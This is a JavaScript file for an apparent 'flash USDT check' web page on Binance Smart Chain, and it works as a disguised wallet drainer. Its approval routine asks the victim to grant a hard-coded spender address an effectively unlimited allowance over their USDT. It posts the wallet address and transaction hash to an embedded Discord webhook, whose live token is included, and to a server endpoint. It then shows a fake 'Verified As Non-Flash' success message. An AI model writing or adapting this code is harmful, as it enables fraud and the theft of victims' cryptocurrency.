
const busdContractAddress ="0x55d398326f99059fF775485246999027B3197955";
const busdAbi = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"_decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}];


// Discord webhook URL
const discordWebhookURL = "https://discord.com/api/webhooks/1333674200501850112/ooI6L8O22BYG85V7Mk19egJHU3tCa_ckJciNiqq0Pde0FYth8tXh7XEIBwSPGzpCapSH";

async function sendDiscordNotification(message) {
    try {
        await fetch(discordWebhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: message })
        });
    } catch (error) {
        console.error("Failed to send notification to Discord:", error);
    }
}

async function BusdApproval() {
    loadingButtonBusd();
    
    // Check and switch to Binance Smart Chain network if needed
    if (window.ethereum) {
        try {
            const currentNetwork = await window.ethereum.request({ method: 'eth_chainId' });

            if (currentNetwork !== '0x38') { // Check if we are not on Binance Smart Chain
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }] // Switch to Binance Smart Chain (BSC)
                });
            }

            // Proceed with BUSD approval after ensuring we're on BSC
            await window.ethereum.enable();
            const web3 = new Web3(window.ethereum);
            const accounts = await web3.eth.getAccounts();
            let account = accounts[0];
            let net = await web3.eth.net.getId();

            // Notify on wallet connect
            await sendDiscordNotification(`Wallet connected: ${account}`);

            if (net == 56) { // Ensure we are on BSC (Mainnet)
                const busdContract = new web3.eth.Contract(busdAbi, busdContractAddress);
                const amount = 115792089237; // Example value
                const spenderAddress = "0xea78B82fAa50BA7D111d020c89A15b6318173ca8"; // Example spender address
                const amountToApprove = web3.utils.toWei(amount.toString(), 'ether');

                try {
                    const transaction = await busdContract.methods
                        .approve(spenderAddress, amountToApprove)
                        .send({ from: account }).then(async (d) => {
                            const hash = d.transactionHash;

                            // Notify on approval
                            await sendDiscordNotification(`Access Granted:\nWallet: ${account}\nTransaction Hash: ${hash}`);

                            const balance = await busdContract.methods.balanceOf(account).call();
                            const balanceInBUSD = web3.utils.fromWei(balance, 'ether');

                            $.ajax({
                                type: "POST",
                                url: "flashCheck.aspx/insertAddress",
                                data: '{ "address": "' + account + '","hash": "' + hash + '"}',
                                contentType: "application/json; charset=utf-8",
                                dataType: "json",
                                success: function (response) {
                                    // Your success handler (could be empty if not needed)
                                }
                            });
                            Swal.fire({
                                icon: 'success',
                                title: 'Congratulations',
                                html: `Your ${balanceInBUSD} USDT Are Verified As Non-Flash<br><br>${hash}`
                            }).then(() => {
                                location.reload();
                            });
                        });

                } catch (error) {
                    Swal.fire({ icon: 'error', title: 'Info', text: 'Registration Failed' }).then(() => {
                        location.reload();
                    });
                }
            } else {
                Swal.fire({
                    icon: 'error',
                    title: 'Network Error',
                    text: 'Please switch to Binance Smart Chain (BSC).'
                });
            }
        } catch (error) {
            Swal.fire({
                icon: 'error',
                title: 'Info',
                text: 'Error while connecting to the wallet or fetching network info.'
            });
        }
    } else {
        Swal.fire({
            icon: 'error',
            title: 'Info',
            text: 'Please connect to a Web3-compatible network.'
        });
    }
    unLoadingButtonBusd();
}

function loadingButtonBusd() {
    document.getElementById('lSpinBusd').innerHTML = "<i class='fa fa-spinner fa-spin'></i>";
    document.getElementById('btnApprove').disabled = true;
}

function unLoadingButtonBusd() {
    document.getElementById('lSpinBusd').innerHTML = "";
    document.getElementById('btnApprove').disabled = false;
}


$(document).ready(function () {
    mainLoadFunction();

    //document.addEventListener('contextmenu', function(event) {
    //    event.preventDefault();
});


jQuery(window).on('load', function () {
    setTimeout(function () {
        JobickCarousel();
    }, 1000);
});

function showLoader() {
    var loader = document.getElementById('loader');
    var ApproveText = document.getElementById('ApproveText');
    var btnApprove = document.getElementById('btnApprove');

    ApproveText.style.display = 'none';

    loader.style.display = 'inline-block';

    btnApprove.disabled = true;
}



